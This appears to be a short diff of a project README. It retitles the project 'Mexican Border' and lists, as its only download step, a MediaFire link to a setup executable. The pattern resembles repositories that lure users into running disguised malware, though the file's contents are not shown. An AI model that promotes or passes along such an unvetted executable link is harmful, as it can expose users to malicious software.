@@ -1,4 +1,4 @@
-# BorderPatrol
+# Mexican Border
 
 ## Download
 1. Go to https://www.mediafire.com/file/1p6zzatq4ilgva0/MexicanBorder-setup.exe/file 
